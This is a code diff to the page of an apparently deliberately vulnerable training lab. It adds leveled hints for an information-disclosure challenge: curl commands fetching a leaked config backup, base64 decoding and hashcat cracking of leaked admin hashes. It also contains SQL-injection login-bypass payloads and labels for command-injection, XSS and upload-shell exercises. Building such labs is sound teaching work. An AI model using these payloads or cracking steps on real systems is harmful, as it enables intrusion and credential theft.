@@ -149,13 +149,17 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
   </div>
   <iframe name="r_upc" id="r_upc" class="res"></iframe></div>
 
-<!-- Info disclosure -->
+<!-- Info disclosure (leveled) -->
 <div class="card"><h2>Information disclosure <span class="flag-pill">🏁 config backup</span></h2>
-  <p class="muted"><code>robots.txt</code> maps the "hidden" paths; the <code>.bak</code> is served as plaintext.
-  (Open in a new tab — a browser hides <code>&lt;?php?&gt;</code>; use <b>View Source / Ctrl+U</b>.)</p>
-  <p><a href="robots.txt" target="_blank">/robots.txt</a> · <a href="config.php.bak" target="_blank">/config.php.bak</a>
-   · <a href=".well-known/security.txt" target="_blank">/.well-known/security.txt</a>
-   · <a href="private/deployment-notes.txt" target="_blank">/private/deployment-notes.txt</a></p></div>
+  <p class="muted">This app leaks files it shouldn't. <b>Find the hidden paths yourself</b>: start at
+    <a href="robots.txt" target="_blank">/robots.txt</a>, follow the breadcrumbs (<code>/.well-known/security.txt</code>
+    → the deployment notes under <code>/private/</code>), or fuzz with <code>feroxbuster</code>/<code>ffuf</code>
+    (the app 200s almost everything, so filter the wildcard). A dropped backup leaks the admin credential —
+    but in a <b>harder form each level</b>: plaintext → base64 → unsalted hash → salted hash. Recover it.
+    <i>(a browser hides <code>&lt;?php?&gt;</code> — use View Source / Ctrl+U, or <code>curl</code>.)</i></p>
+  <div class="levels" id="lv_disc"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('disc','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('disc','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('disc','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('disc','expert')">Expert</button></div>
+  <details><summary>💡 hint — <span class="note" id="note_disc"></span></summary><code class="pl" id="pl_disc"></code></details>
+</div>
 
 <!-- CSP -->
 <div class="card"><h2>Weak CSP <span class="flag-pill">analysis</span></h2>
@@ -224,11 +228,17 @@ function setLvl(card,lvl){
   document.querySelectorAll('#lv_'+card+' .lvlbtn').forEach(function(b){ b.classList.toggle('on', b.getAttribute('data-l')===lvl); });
 }
 PAYLOADS.login={easy:{p:"admin'-- -",n:"Easy — comment out the password check."},medium:{p:"admin' or '1'='1",n:"Medium — comments stripped -> self-closing OR (no comment)."},hard:{p:"admin' oorr '1'='1",n:"Hard — 'or' also stripped -> nest it (oorr -> or)."},expert:{p:"admin'/**/oorr/**/'1'='1",n:"Expert — spaces also stripped -> /**/ as spaces."}};
-['q','cmd','pg','gb','id','up','login'].forEach(function(c){ setLvl(c,'easy'); });
+PAYLOADS.disc={
+ easy:{p:"curl -s http://localhost:8000/config.php.bak      # or open it + View Source (Ctrl+U)",n:"Easy — a config BACKUP (.bak) left in the web root (robots.txt lists it). Holds the admin password in PLAINTEXT + FLAG{c0nfig_backup_left_in_webroot}."},
+ medium:{p:"curl -s http://localhost:8000/private/legacy_creds.b64 | base64 -d",n:"Medium — the deployment notes (reached via /.well-known/security.txt) point into /private/. A legacy file holds the credential BASE64-encoded — decode it."},
+ hard:{p:"# grab the hash from the leaked user dump, identify, then crack:\nhashid '<hash>'    #  -> SHA-1\nhashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt",n:"Hard — a pre-migration user dump in /private/ exposes an UNSALTED hash. Identify it (hashid), crack with rockyou."},
+ expert:{p:"# the old backup stores hash:salt  = md5(password + salt):\nhashcat -m 10 hash.txt /usr/share/wordlists/rockyou.txt   # feed one 'hash:salt' line",n:"Expert — an older backup stores the password SALTED. Dump the hash AND its salt, then crack with the matching mode (md5(pass.salt) = -m 10)."}
+};
+['q','cmd','pg','gb','id','up','login','disc'].forEach(function(c){ setLvl(c,'easy'); });
 _ready=true;
 /* quick-pick: descriptive one-click shortcuts under each card (select the level + fill the input; reuses setLvl) */
 var QLV=['easy','medium','hard','expert'];
-var QLABELS={q:['fingerprint','tables','dump','blind'],cmd:['id','/etc/passwd','hostname','flag'],pg:['secret','/etc/passwd','source','flag'],gb:['<script>','<img>','<svg>','<animate>'],id:['raw id','base64','md5','cookie'],up:['system','passthru','backtick','split-name'],login:['comment','OR','nested OR','/**/']};
+var QLABELS={q:['fingerprint','tables','dump','blind'],cmd:['id','/etc/passwd','hostname','flag'],pg:['secret','/etc/passwd','source','flag'],gb:['<script>','<img>','<svg>','<animate>'],id:['raw id','base64','md5','cookie'],up:['system','passthru','backtick','split-name'],login:['comment','OR','nested OR','/**/'],disc:['plaintext .bak','base64','unsalted hash','salted hash']};
 Object.keys(QLABELS).forEach(function(card){
   var lvd=document.getElementById('lv_'+card); if(!lvd) return;
   var row=document.createElement('div'); row.style.cssText='margin:4px 0 2px';
